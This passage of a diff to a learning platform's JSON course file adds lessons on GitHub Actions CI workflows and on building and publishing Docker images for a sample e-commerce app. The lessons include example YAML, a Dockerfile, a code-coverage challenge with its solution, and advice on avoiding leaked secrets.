@@ -13247,7 +13247,7 @@
       "title": "CI/CD with GitHub Actions",
       "description": "Automate your build, test, and deployment pipeline. Learn GitHub Actions to ensure ShopFlow quality with every commit.",
       "difficulty": "intermediate",
-      "estimatedHours": 3,
+      "estimatedHours": 4,
       "lessons": [
         {
           "id": "lesson-24-01",
@@ -13361,6 +13361,500 @@
                 }
               ],
               "difficulty": "intermediate"
+            }
+          ]
+        },
+        {
+          "id": "lesson-24-02",
+          "title": "GitHub Actions: Workflow Fundamentals",
+          "moduleId": "module-24",
+          "order": 2,
+          "estimatedMinutes": 40,
+          "difficulty": "intermediate",
+          "contentSections": [
+            {
+              "type": "ANALOGY",
+              "title": "Workflows as Assembly Lines",
+              "content": "Picture a modern automobile manufacturing plant with multiple assembly lines running simultaneously. Each assembly line (workflow) is triggered when raw materials arrive (code is pushed). The line consists of multiple stations (jobs) where specialized work happens: the body shop welds the frame, the paint shop applies coatings, and the final assembly installs the engine and interior. At each station, workers (runners) perform specific tasks (steps) in a precise sequence.\n\nGitHub Actions workflows mirror this industrial process perfectly. When you push code, it triggers a workflow - your digital assembly line. The workflow contains jobs, each representing a major phase of work like building, testing, or deploying. Jobs run on runners, which are virtual machines that serve as your factory workers. Within each job, steps execute sequentially, just as tasks at an assembly station must happen in order: you cannot install the windshield before the frame exists.\n\nThe assembly line analogy extends further. Stations can run in parallel when they are independent - the paint shop and the electronics testing facility can work on different cars simultaneously. Similarly, GitHub Actions jobs run in parallel by default, only waiting when one job explicitly depends on another. Quality control checkpoints at each station halt the line if defects are found, just as failing tests stop your pipeline before bad code reaches production.\n\nServices in GitHub Actions are like the utility infrastructure supporting the factory: electricity, water, and compressed air that machines need to function. Your tests might need a database or cache server - these run as services alongside your job, providing the infrastructure your code requires to execute properly. The service containers start before your steps run and remain available throughout the job, just as factory utilities remain on during the entire shift."
+            },
+            {
+              "type": "EXAMPLE",
+              "title": "Anatomy of a GitHub Actions Workflow",
+              "content": "This comprehensive workflow demonstrates all major GitHub Actions concepts. We will build, test, and prepare ShopFlow for deployment, using services, caching, and job dependencies.",
+              "code": "# ===== .github/workflows/ci.yml =====\n# Complete CI workflow for ShopFlow e-commerce application\n\nname: ShopFlow CI Pipeline\n\n# TRIGGERS: Define when this workflow executes\non:\n  # Run on pushes to main and develop branches\n  push:\n    branches: [main, develop]\n    paths-ignore:\n      - '**.md'           # Skip for documentation changes\n      - 'docs/**'         # Skip for docs folder\n  \n  # Run on PRs targeting main\n  pull_request:\n    branches: [main]\n    types: [opened, synchronize, reopened]\n  \n  # Allow manual triggers from GitHub UI\n  workflow_dispatch:\n    inputs:\n      run_integration_tests:\n        description: 'Run integration tests'\n        required: false\n        default: true\n        type: boolean\n  \n  # Scheduled nightly build\n  schedule:\n    - cron: '0 2 * * *'   # Run at 2 AM UTC daily\n\n# Environment variables available to all jobs\nenv:\n  DOTNET_VERSION: '9.0.x'\n  DOTNET_SKIP_FIRST_TIME_EXPERIENCE: true\n  DOTNET_CLI_TELEMETRY_OPTOUT: true\n\n# JOBS: Define the work to perform\njobs:\n  # ========== BUILD JOB ==========\n  build:\n    name: Build Application\n    runs-on: ubuntu-latest\n    \n    outputs:\n      version: ${{ steps.version.outputs.version }}\n    \n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n        with:\n          fetch-depth: 0    # Full history for versioning\n      \n      - name: Setup .NET SDK\n        uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: ${{ env.DOTNET_VERSION }}\n      \n      # Cache NuGet packages for faster builds\n      - name: Cache NuGet packages\n        uses: actions/cache@v4\n        with:\n          path: ~/.nuget/packages\n          key: ${{ runner.os }}-nuget-${{ hashFiles('**/*.csproj') }}\n          restore-keys: |\n            ${{ runner.os }}-nuget-\n      \n      - name: Restore dependencies\n        run: dotnet restore ShopFlow.sln\n      \n      - name: Build solution\n        run: dotnet build ShopFlow.sln --no-restore --configuration Release\n      \n      # Generate version from git tags\n      - name: Generate version\n        id: version\n        run: |\n          VERSION=$(git describe --tags --always --dirty)\n          echo \"version=$VERSION\" >> $GITHUB_OUTPUT\n          echo \"Generated version: $VERSION\"\n      \n      # Upload build artifacts for other jobs\n      - name: Upload build artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: build-output\n          path: |\n            src/**/bin/Release/net9.0/\n            !src/**/bin/Release/net9.0/**/*.pdb\n          retention-days: 7\n\n  # ========== UNIT TESTS JOB ==========\n  unit-tests:\n    name: Unit Tests\n    needs: build           # Wait for build to complete\n    runs-on: ubuntu-latest\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Setup .NET SDK\n        uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: ${{ env.DOTNET_VERSION }}\n      \n      - name: Cache NuGet packages\n        uses: actions/cache@v4\n        with:\n          path: ~/.nuget/packages\n          key: ${{ runner.os }}-nuget-${{ hashFiles('**/*.csproj') }}\n          restore-keys: |\n            ${{ runner.os }}-nuget-\n      \n      - name: Restore and build\n        run: dotnet build tests/ShopFlow.Tests.Unit --configuration Release\n      \n      - name: Run unit tests\n        run: |\n          dotnet test tests/ShopFlow.Tests.Unit \\\n            --no-build \\\n            --configuration Release \\\n            --logger \"trx;LogFileName=test-results.trx\" \\\n            --collect:\"XPlat Code Coverage\"\n      \n      # Upload test results for PR annotations\n      - name: Upload test results\n        uses: actions/upload-artifact@v4\n        if: always()        # Upload even if tests fail\n        with:\n          name: unit-test-results\n          path: '**/test-results.trx'\n\n  # ========== INTEGRATION TESTS JOB ==========\n  integration-tests:\n    name: Integration Tests\n    needs: build\n    runs-on: ubuntu-latest\n    if: github.event.inputs.run_integration_tests != 'false'\n    \n    # Services provide external dependencies\n    services:\n      postgres:\n        image: postgres:16\n        env:\n          POSTGRES_USER: shopflow\n          POSTGRES_PASSWORD: shopflow_test\n          POSTGRES_DB: shopflow_test\n        ports:\n          - 5432:5432\n        options: >-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n      \n      redis:\n        image: redis:7-alpine\n        ports:\n          - 6379:6379\n        options: >-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Setup .NET SDK\n        uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: ${{ env.DOTNET_VERSION }}\n      \n      - name: Cache NuGet packages\n        uses: actions/cache@v4\n        with:\n          path: ~/.nuget/packages\n          key: ${{ runner.os }}-nuget-${{ hashFiles('**/*.csproj') }}\n          restore-keys: |\n            ${{ runner.os }}-nuget-\n      \n      - name: Restore and build\n        run: dotnet build tests/ShopFlow.Tests.Integration --configuration Release\n      \n      - name: Run integration tests\n        run: |\n          dotnet test tests/ShopFlow.Tests.Integration \\\n            --no-build \\\n            --configuration Release \\\n            --logger \"trx;LogFileName=integration-results.trx\"\n        env:\n          ConnectionStrings__DefaultConnection: \"Host=localhost;Database=shopflow_test;Username=shopflow;Password=shopflow_test\"\n          ConnectionStrings__Redis: \"localhost:6379\"\n      \n      - name: Upload test results\n        uses: actions/upload-artifact@v4\n        if: always()\n        with:\n          name: integration-test-results\n          path: '**/integration-results.trx'\n\n  # ========== CODE QUALITY JOB ==========\n  code-quality:\n    name: Code Quality Analysis\n    needs: build\n    runs-on: ubuntu-latest\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Setup .NET SDK\n        uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: ${{ env.DOTNET_VERSION }}\n      \n      - name: Restore dependencies\n        run: dotnet restore ShopFlow.sln\n      \n      # Run code formatting check\n      - name: Check code formatting\n        run: dotnet format ShopFlow.sln --verify-no-changes --verbosity diagnostic\n      \n      # Run security vulnerability scan\n      - name: Check for vulnerable packages\n        run: dotnet list package --vulnerable --include-transitive 2>&1 | tee vuln-report.txt\n      \n      - name: Fail if vulnerabilities found\n        run: |\n          if grep -q \"has the following vulnerable packages\" vuln-report.txt; then\n            echo \"::error::Vulnerable packages detected!\"\n            exit 1\n          fi\n\n  # ========== SUMMARY JOB ==========\n  ci-complete:\n    name: CI Complete\n    needs: [unit-tests, integration-tests, code-quality]\n    runs-on: ubuntu-latest\n    if: always()           # Run even if previous jobs failed\n    \n    steps:\n      - name: Check job results\n        run: |\n          if [[ \"${{ needs.unit-tests.result }}\" == \"failure\" ]] || \\\n             [[ \"${{ needs.integration-tests.result }}\" == \"failure\" ]] || \\\n             [[ \"${{ needs.code-quality.result }}\" == \"failure\" ]]; then\n            echo \"::error::One or more CI jobs failed\"\n            exit 1\n          fi\n          echo \"All CI checks passed successfully!\"",
+              "language": "yaml"
+            },
+            {
+              "type": "THEORY",
+              "title": "Key Workflow Concepts",
+              "content": "## Workflow Triggers\n\nTriggers define when your workflow executes. GitHub Actions supports numerous trigger types for different automation scenarios:\n\n| Trigger | Description | Common Use Case |\n|---------|-------------|----------------|\n| `push` | Code pushed to repository | Run CI on every commit |\n| `pull_request` | PR opened, updated, or merged | Validate changes before merge |\n| `schedule` | Cron-based timing | Nightly builds, dependency updates |\n| `workflow_dispatch` | Manual trigger from UI | On-demand deployments |\n| `release` | Release created or published | Production deployments |\n| `workflow_call` | Called by another workflow | Reusable workflow libraries |\n\nTriggers can be filtered by branches, tags, paths, and event types. For example, `push.branches: [main]` only triggers on pushes to main, while `push.paths-ignore: ['**.md']` skips workflow runs when only markdown files change. This filtering reduces unnecessary builds and conserves your Actions minutes.\n\n## Runners: The Execution Environment\n\nRunners are the machines that execute your workflows. GitHub provides hosted runners with pre-installed tools:\n\n| Runner | OS | Specs | Use Case |\n|--------|---------|-------|----------|\n| `ubuntu-latest` | Ubuntu 24.04 | 4 cores, 16GB RAM | Default for most workflows |\n| `windows-latest` | Windows Server 2022 | 4 cores, 16GB RAM | .NET Framework, Windows-specific |\n| `macos-latest` | macOS Sonoma | 3 cores, 14GB RAM | iOS/macOS builds, Xcode |\n\nHosted runners are ephemeral: each job gets a fresh machine, ensuring no state carries over between runs. For specialized needs, self-hosted runners allow you to use your own infrastructure with custom software, hardware, or network access.\n\n## Job Dependencies with `needs`\n\nBy default, jobs run in parallel. The `needs` keyword creates dependencies, forcing sequential execution:\n\n```yaml\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps: [...]\n  \n  test:\n    needs: build        # Waits for build to complete\n    runs-on: ubuntu-latest\n    steps: [...]\n  \n  deploy:\n    needs: [build, test] # Waits for BOTH to complete\n    runs-on: ubuntu-latest\n    steps: [...]\n```\n\nUse `needs` when jobs depend on artifacts or state from previous jobs. Keep jobs independent when possible to maximize parallelization and reduce total pipeline duration.\n\n## Job Outputs and Artifacts\n\nJobs can share data through outputs and artifacts. Outputs are small values like version strings or status flags. Artifacts are files like build outputs, test results, or logs.\n\n**Outputs** pass small data between jobs:\n```yaml\njobs:\n  build:\n    outputs:\n      version: ${{ steps.ver.outputs.version }}\n    steps:\n      - id: ver\n        run: echo \"version=1.2.3\" >> $GITHUB_OUTPUT\n  \n  deploy:\n    needs: build\n    steps:\n      - run: echo \"Deploying version ${{ needs.build.outputs.version }}\"\n```\n\n**Artifacts** pass files between jobs or preserve them for download:\n```yaml\n- uses: actions/upload-artifact@v4\n  with:\n    name: build-output\n    path: bin/Release/\n\n# In another job:\n- uses: actions/download-artifact@v4\n  with:\n    name: build-output\n```\n\n## Conditional Execution\n\nThe `if` keyword controls whether jobs or steps run based on context:\n\n```yaml\njobs:\n  deploy:\n    if: github.ref == 'refs/heads/main'    # Only deploy from main\n    \n  notify:\n    if: always()                             # Run even if previous jobs failed\n    \nsteps:\n  - name: Upload coverage\n    if: success()                            # Only if previous steps succeeded\n    \n  - name: Send failure alert\n    if: failure()                            # Only if previous steps failed\n```\n\nCommon conditions include `success()`, `failure()`, `always()`, `cancelled()`, and expressions comparing context variables like `github.event_name`, `github.actor`, or `github.ref`."
+            },
+            {
+              "type": "WARNING",
+              "title": "Common Workflow Mistakes",
+              "content": "## Exposing Secrets in Logs\n\nOne of the most dangerous mistakes is accidentally printing secrets to workflow logs. GitHub automatically masks secrets you reference with `${{ secrets.NAME }}`, but secrets passed through environment variables or written to files can leak if echoed carelessly.\n\n**The Problem:**\n```yaml\n- name: Debug connection\n  run: echo \"Connecting to $DATABASE_URL\"  # DANGER: Prints password!\n  env:\n    DATABASE_URL: \"postgres://user:${{ secrets.DB_PASSWORD }}@host/db\"\n```\n\n**The Fix:** Never echo variables that contain secrets. Use `add-mask` for dynamically generated secrets:\n```yaml\n- run: echo \"::add-mask::$GENERATED_TOKEN\"\n```\n\n## Not Caching Dependencies\n\nWithout caching, every workflow run downloads all dependencies fresh. For a .NET project with many NuGet packages, this adds minutes to every build.\n\n**Before (no caching):** 4-5 minutes for restore\n**After (with caching):** 10-20 seconds for cache hit\n\n```yaml\n- uses: actions/cache@v4\n  with:\n    path: ~/.nuget/packages\n    key: ${{ runner.os }}-nuget-${{ hashFiles('**/*.csproj') }}\n```\n\nThe cache key includes a hash of project files, so the cache invalidates when dependencies change. Always add caching for package managers (NuGet, npm, pip, etc.).\n\n## Tests Modifying Shared State\n\nIntegration tests that modify a shared database without cleanup cause intermittent failures. Test A creates data, Test B expects an empty database, and the order of execution determines success.\n\n**The Problem:**\n```csharp\n[Fact]\npublic async Task CreateOrder_SavesOrder()\n{\n    var order = new Order { ... };\n    await _dbContext.Orders.AddAsync(order);  // Leaves data behind!\n    await _dbContext.SaveChangesAsync();\n}\n```\n\n**The Fix:** Use database transactions that rollback after each test, or use a fresh database per test run:\n```csharp\npublic class IntegrationTestBase : IAsyncLifetime\n{\n    public async Task InitializeAsync()\n    {\n        await _dbContext.Database.BeginTransactionAsync();\n    }\n    \n    public async Task DisposeAsync()\n    {\n        await _dbContext.Database.RollbackTransactionAsync();\n    }\n}\n```\n\n## Ignoring Failing Builds\n\nWhen builds fail frequently, teams develop 'alarm fatigue' and stop paying attention. Failed main branch builds become normal, and real problems slip through.\n\n**Prevention strategies:**\n1. Treat failed builds as P1 incidents requiring immediate attention\n2. Use branch protection rules requiring passing CI before merge\n3. Add notifications to team channels for failures\n4. Track and fix flaky tests immediately\n5. Review build history weekly to identify patterns\n\n## Running Expensive Jobs Unnecessarily\n\nRunning all tests on every documentation change wastes compute resources and delays feedback.\n\n**The Fix:** Use path filters to skip irrelevant workflows:\n```yaml\non:\n  push:\n    paths-ignore:\n      - '**.md'\n      - 'docs/**'\n      - '.github/**'\n```\n\nOr use conditional job execution:\n```yaml\njobs:\n  check-changes:\n    outputs:\n      should-test: ${{ steps.filter.outputs.src }}\n    steps:\n      - uses: dorny/paths-filter@v3\n        id: filter\n        with:\n          filters: |\n            src:\n              - 'src/**'\n              - 'tests/**'\n  \n  test:\n    needs: check-changes\n    if: needs.check-changes.outputs.should-test == 'true'\n```"
+            }
+          ],
+          "challenges": [
+            {
+              "type": "FREE_CODING",
+              "id": "lesson-24-02-challenge-01",
+              "title": "Add Code Coverage to Workflow",
+              "description": "Enhance a CI workflow with code coverage collection and reporting.",
+              "instructions": "Add code coverage to the ShopFlow CI workflow!\n\n1. Configure the test step to collect code coverage using Coverlet\n2. Add a step to upload coverage results to Codecov\n3. Add a step to generate a coverage badge\n4. Ensure coverage data is collected even if some tests fail\n\nThe workflow already has a working test job. You need to:\n- Add coverage collection to the dotnet test command\n- Add the Codecov upload action\n- Set appropriate thresholds for coverage",
+              "starterCode": "# Add code coverage to this test job\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Setup .NET\n        uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: '9.0.x'\n      \n      - name: Restore dependencies\n        run: dotnet restore\n      \n      - name: Build\n        run: dotnet build --no-restore --configuration Release\n      \n      # TODO: Update this step to collect code coverage\n      - name: Run tests\n        run: dotnet test --no-build --configuration Release\n      \n      # TODO: Add step to upload coverage to Codecov\n      # Use: codecov/codecov-action@v4\n      # Hint: Use the 'if: always()' condition to upload even on test failure\n      \n      # TODO: Add step to fail if coverage is below threshold\n      # Check that line coverage is at least 70%",
+              "solution": "# Add code coverage to this test job\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    \n    steps:\n      - uses: actions/checkout@v4\n      \n      - name: Setup .NET\n        uses: actions/setup-dotnet@v4\n        with:\n          dotnet-version: '9.0.x'\n      \n      - name: Restore dependencies\n        run: dotnet restore\n      \n      - name: Build\n        run: dotnet build --no-restore --configuration Release\n      \n      - name: Run tests with coverage\n        run: |\n          dotnet test --no-build --configuration Release \\\n            --collect:\"XPlat Code Coverage\" \\\n            --results-directory ./coverage \\\n            -- DataCollectionRunSettings.DataCollectors.DataCollector.Configuration.Format=cobertura\n      \n      - name: Upload coverage to Codecov\n        uses: codecov/codecov-action@v4\n        if: always()\n        with:\n          token: ${{ secrets.CODECOV_TOKEN }}\n          files: ./coverage/**/coverage.cobertura.xml\n          fail_ci_if_error: false\n          verbose: true\n      \n      - name: Check coverage threshold\n        run: |\n          # Install coverage tool\n          dotnet tool install -g dotnet-reportgenerator-globaltool\n          \n          # Generate summary\n          reportgenerator \\\n            -reports:./coverage/**/coverage.cobertura.xml \\\n            -targetdir:./coverage/report \\\n            -reporttypes:TextSummary\n          \n          # Check threshold\n          COVERAGE=$(grep -oP 'Line coverage: \\K[0-9.]+' ./coverage/report/Summary.txt)\n          echo \"Line coverage: $COVERAGE%\"\n          \n          if (( $(echo \"$COVERAGE < 70\" | bc -l) )); then\n            echo \"::error::Coverage $COVERAGE% is below threshold of 70%\"\n            exit 1\n          fi",
+              "language": "yaml",
+              "testCases": [
+                {
+                  "id": "test-1",
+                  "description": "Should use XPlat Code Coverage collector",
+                  "expectedOutput": "XPlat Code Coverage",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-2",
+                  "description": "Should use Codecov action",
+                  "expectedOutput": "codecov/codecov-action",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-3",
+                  "description": "Should upload even on failure",
+                  "expectedOutput": "if: always()",
+                  "isVisible": true
+                },
+                {
+                  "id": "test-4",
+                  "description": "Should check coverage threshold",
+                  "expectedOutput": "70",
+                  "isVisible": true
+                }
+              ],
+              "hints": [
+                {
+                  "level": 1,
+                  "text": "Add --collect:\"XPlat Code Coverage\" to the dotnet test command for Coverlet collection."
+                },
+                {
+                  "level": 2,
+                  "text": "Use --results-directory ./coverage to organize coverage output files."
+                },
+                {
+                  "level": 3,
+                  "text": "The codecov/codecov-action@v4 uploads coverage reports. Use the 'files' parameter to specify coverage file paths."
+                },
+                {
+                  "level": 4,
+                  "text": "Use 'if: always()' on the upload step to upload coverage even when tests fail."
+                },
+                {
+                  "level": 5,
+                  "text": "Use reportgenerator to parse coverage and extract the percentage for threshold checking."
+                }
+              ],
+              "commonMistakes": [
+                {
+                  "mistake": "Not specifying coverage output format",
+                  "consequence": "Coverage files may be in wrong format for Codecov upload, causing upload failures.",
+                  "correction": "Add the format parameter: -- DataCollectionRunSettings.DataCollectors.DataCollector.Configuration.Format=cobertura"
+                },
+                {
+                  "mistake": "Only uploading coverage on success",
+                  "consequence": "Failing tests prevent coverage upload, losing visibility into what code was tested.",
+                  "correction": "Use 'if: always()' to upload coverage regardless of test results."
+                },
+                {
+                  "mistake": "Hardcoding Codecov token in workflow",
+                  "consequence": "Token exposed in repository, allowing anyone to upload fake coverage data.",
+                  "correction": "Store token in GitHub Secrets and reference with ${{ secrets.CODECOV_TOKEN }}."
+                },
+                {
+                  "mistake": "Using fail_ci_if_error: true for Codecov upload",
+                  "consequence": "Temporary Codecov outages fail your entire CI pipeline unnecessarily.",
+                  "correction": "Set fail_ci_if_error: false for resilience against external service issues."
+                }
+              ],
+              "difficulty": "intermediate"
+            }
+          ]
+        },
+        {
+          "id": "lesson-24-03",
+          "title": "Building and Publishing Docker Images",
+          "moduleId": "module-24",
+          "order": 3,
+          "estimatedMinutes": 45,
+          "difficulty": "intermediate",
+          "contentSections": [
+            {
+              "type": "ANALOGY",
+              "title": "Docker Images as Shipping Containers",
+              "content": "Before the 1950s, shipping goods internationally was chaotic and expensive. Every port had different equipment, every cargo required custom handling, and loading a ship could take weeks. Then Malcolm McLean invented the standardized shipping container - a simple steel box with universal dimensions. Suddenly, it did not matter what was inside: electronics from Japan, coffee from Brazil, or machinery from Germany. The container was the same size, fit the same cranes, and stacked on the same ships. Global shipping costs dropped by 90%, and international trade exploded.\n\nDocker containers bring the same revolution to software. Before containers, deploying an application meant carefully configuring the production server to match the development environment. Different operating systems, library versions, and configurations caused endless 'works on my machine' problems. Operations teams maintained detailed runbooks for installing each application, and deployments took hours of careful work.\n\nA Docker image is like a shipping container for your application. It packages your code, runtime, libraries, and configuration into a standardized unit that runs identically everywhere. The ShopFlow API image contains .NET 9, your compiled application, and all dependencies. Whether you run it on your laptop, in a test environment, or on a production Kubernetes cluster, the behavior is identical. The container isolates your application from the host system, eliminating environment-specific bugs.\n\nThe container analogy extends to the build process. Just as a factory packs goods into containers before shipping, your CI pipeline builds Docker images before deployment. The image becomes the artifact - a tested, versioned, immutable package that flows through your environments. Development builds the image, staging runs it for testing, and production runs the exact same image after approval. This consistency is the foundation of reliable deployments."
+            },
+            {
+              "type": "EXAMPLE",
+              "title": "Multi-Stage Dockerfile for ShopFlow",
+              "content": "This production Dockerfile uses multi-stage builds to create an optimized, secure container image. Each stage serves a specific purpose, and only the minimal runtime dependencies end up in the final image.",
+              "code": "# ===== Multi-Stage Dockerfile for ShopFlow API =====\n# Stage 1: Build environment\n# Stage 2: Test environment  \n# Stage 3: Production runtime\n\n# ========== STAGE 1: BUILD ==========\n# Use the SDK image for building (includes compiler, MSBuild, etc.)\nFROM mcr.microsoft.com/dotnet/sdk:9.0 AS build\n\n# Set working directory inside container\nWORKDIR /src\n\n# Copy project files first (for layer caching)\n# Changes to source code won't invalidate this cached layer\nCOPY [\"src/ShopFlow.Api/ShopFlow.Api.csproj\", \"ShopFlow.Api/\"]\nCOPY [\"src/ShopFlow.Core/ShopFlow.Core.csproj\", \"ShopFlow.Core/\"]\nCOPY [\"src/ShopFlow.Infrastructure/ShopFlow.Infrastructure.csproj\", \"ShopFlow.Infrastructure/\"]\nCOPY [\"Directory.Build.props\", \".\"]\nCOPY [\"Directory.Packages.props\", \".\"]\n\n# Restore NuGet packages (cached unless .csproj changes)\nRUN dotnet restore \"ShopFlow.Api/ShopFlow.Api.csproj\"\n\n# Copy remaining source code\nCOPY src/ .\n\n# Build the application in Release mode\nRUN dotnet build \"ShopFlow.Api/ShopFlow.Api.csproj\" \\\n    -c Release \\\n    -o /app/build \\\n    --no-restore\n\n# Publish the application (creates deployment-ready output)\nRUN dotnet publish \"ShopFlow.Api/ShopFlow.Api.csproj\" \\\n    -c Release \\\n    -o /app/publish \\\n    --no-build \\\n    /p:UseAppHost=false\n\n# ========== STAGE 2: TEST ==========\n# Run tests in a separate stage to validate before publishing\nFROM build AS test\n\nWORKDIR /src\n\n# Copy test projects\nCOPY [\"tests/ShopFlow.Tests.Unit/ShopFlow.Tests.Unit.csproj\", \"tests/ShopFlow.Tests.Unit/\"]\nCOPY [\"tests/ShopFlow.Tests.Integration/ShopFlow.Tests.Integration.csproj\", \"tests/ShopFlow.Tests.Integration/\"]\n\n# Restore test dependencies\nRUN dotnet restore \"tests/ShopFlow.Tests.Unit/ShopFlow.Tests.Unit.csproj\"\n\n# Copy test source code\nCOPY tests/ tests/\n\n# Run unit tests (integration tests need external services)\nRUN dotnet test \"tests/ShopFlow.Tests.Unit/ShopFlow.Tests.Unit.csproj\" \\\n    -c Release \\\n    --no-restore \\\n    --logger:\"console;verbosity=normal\"\n\n# ========== STAGE 3: PRODUCTION RUNTIME ==========\n# Use the minimal ASP.NET runtime image (no SDK, no compiler)\nFROM mcr.microsoft.com/dotnet/aspnet:9.0-alpine AS runtime\n\n# Security: Run as non-root user\nRUN addgroup -S shopflow && adduser -S shopflow -G shopflow\n\n# Install curl for health checks (minimal addition)\nRUN apk add --no-cache curl\n\nWORKDIR /app\n\n# Copy published output from build stage\nCOPY --from=build /app/publish .\n\n# Set ownership to non-root user\nRUN chown -R shopflow:shopflow /app\nUSER shopflow\n\n# Expose the port the app listens on\nEXPOSE 8080\n\n# Set environment variables\nENV ASPNETCORE_URLS=http://+:8080\nENV ASPNETCORE_ENVIRONMENT=Production\nENV DOTNET_RUNNING_IN_CONTAINER=true\n\n# Health check command\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n    CMD curl -f http://localhost:8080/healthz/live || exit 1\n\n# Entry point - run the application\nENTRYPOINT [\"dotnet\", \"ShopFlow.Api.dll\"]",
+              "language": "dockerfile"
+            },
+            {
+              "type": "EXAMPLE",
+              "title": "GitHub Actions Docker Workflow",
+              "content": "This workflow builds and publishes Docker images to GitHub Container Registry. It uses Docker Buildx for advanced features like multi-platform builds and layer caching.",
+              "code": "# ===== .github/workflows/docker.yml =====\n# Build and publish Docker images for ShopFlow\n\nname: Docker Build and Push\n\non:\n  push:\n    branches: [main]\n    tags: ['v*.*.*']      # Trigger on version tags\n  pull_request:\n    branches: [main]\n\n# Required permissions for GHCR\npermissions:\n  contents: read\n  packages: write\n\nenv:\n  REGISTRY: ghcr.io\n  IMAGE_NAME: ${{ github.repository }}\n\njobs:\n  build-and-push:\n    name: Build and Push Docker Image\n    runs-on: ubuntu-latest\n    \n    steps:\n      - name: Checkout repository\n        uses: actions/checkout@v4\n      \n      # Set up QEMU for multi-platform builds (ARM64, etc.)\n      - name: Set up QEMU\n        uses: docker/setup-qemu-action@v3\n      \n      # Set up Docker Buildx for advanced build features\n      - name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@v3\n        with:\n          driver-opts: |\n            image=moby/buildkit:v0.12.0\n      \n      # Log in to GitHub Container Registry\n      - name: Log in to Container Registry\n        uses: docker/login-action@v3\n        with:\n          registry: ${{ env.REGISTRY }}\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n      \n      # Extract metadata (tags, labels) for Docker\n      - name: Extract Docker metadata\n        id: meta\n        uses: docker/metadata-action@v5\n        with:\n          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}\n          tags: |\n            # Tag with 'latest' for main branch\n            type=raw,value=latest,enable=${{ github.ref == 'refs/heads/main' }}\n            # Tag with branch name\n            type=ref,event=branch\n            # Tag with PR number\n            type=ref,event=pr\n            # Tag with semantic version (v1.2.3 -> 1.2.3, 1.2, 1)\n            type=semver,pattern={{version}}\n            type=semver,pattern={{major}}.{{minor}}\n            type=semver,pattern={{major}}\n            # Tag with commit SHA\n            type=sha,prefix=sha-\n      \n      # Build and push Docker image\n      - name: Build and push Docker image\n        uses: docker/build-push-action@v5\n        with:\n          context: .\n          file: ./Dockerfile\n          # Push only for main branch and tags, not PRs\n          push: ${{ github.event_name != 'pull_request' }}\n          tags: ${{ steps.meta.outputs.tags }}\n          labels: ${{ steps.meta.outputs.labels }}\n          # Multi-platform build\n          platforms: linux/amd64,linux/arm64\n          # Cache layers in GitHub Actions cache\n          cache-from: type=gha\n          cache-to: type=gha,mode=max\n          # Build arguments\n          build-args: |\n            BUILD_VERSION=${{ github.sha }}\n            BUILD_DATE=${{ github.event.head_commit.timestamp }}\n      \n      # Generate SBOM (Software Bill of Materials) for security\n      - name: Generate SBOM\n        uses: anchore/sbom-action@v0\n        if: github.event_name != 'pull_request'\n        with:\n          image: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:sha-${{ github.sha }}\n          artifact-name: sbom.spdx.json\n      \n      # Scan image for vulnerabilities\n      - name: Run Trivy vulnerability scanner\n        uses: aquasecurity/trivy-action@master\n        with:\n          image-ref: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:sha-${{ github.sha }}\n          format: 'sarif'\n          output: 'trivy-results.sarif'\n          severity: 'CRITICAL,HIGH'\n      \n      # Upload scan results to GitHub Security\n      - name: Upload Trivy scan results\n        uses: github/codeql-action/upload-sarif@v3\n        if: always()\n        with:\n          sarif_file: 'trivy-results.sarif'\n      \n      # Output the image digest for downstream jobs\n      - name: Output image digest\n        run: |\n          echo \"Image digest: ${{ steps.build-push.outputs.digest }}\"\n          echo \"Image pushed to: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}\"",
+              "language": "yaml"
+            },
+            {
+              "type": "THEORY",
+              "title": "Image Optimization Techniques",
+              "content": "## Multi-Stage Builds\n\nMulti-stage builds dramatically reduce final image size by separating build-time and runtime dependencies. A typical .NET SDK image weighs over 800MB, while the runtime-only image is under 200MB. By using the SDK in the build stage and copying only the published output to a runtime stage, you create smaller, faster, more secure images.\n\n**Before (single-stage):** 850MB image with SDK, compiler, build tools\n**After (multi-stage):** 180MB image with only runtime and application\n\nThe build stage can include development tools, test frameworks, and build-time dependencies. The final stage contains only what runs in production. Each stage is a separate image that can be cached independently.\n\n## Base Image Selection\n\nChoosing the right base image balances size, security, and compatibility:\n\n| Base Image | Size | Security | Compatibility |\n|------------|------|----------|---------------|\n| `aspnet:9.0` | ~220MB | Good | Full glibc, broad compatibility |\n| `aspnet:9.0-alpine` | ~100MB | Better | musl libc, most apps work |\n| `aspnet:9.0-chiseled` | ~50MB | Best | Minimal attack surface |\n\nAlpine-based images use musl libc instead of glibc, which occasionally causes compatibility issues with certain NuGet packages. Chiseled images are the smallest and most secure but contain no shell or package manager, making debugging difficult.\n\n## Layer Caching\n\nDocker builds images in layers, caching each layer for reuse. Optimize for caching by:\n\n1. **Order commands by change frequency**: Put rarely-changing steps first\n2. **Copy dependency files before source code**: Project files change less often than source\n3. **Use .dockerignore**: Exclude files that would invalidate cache unnecessarily\n\n```dockerfile\n# GOOD: Copy .csproj first, then restore\nCOPY *.csproj ./\nRUN dotnet 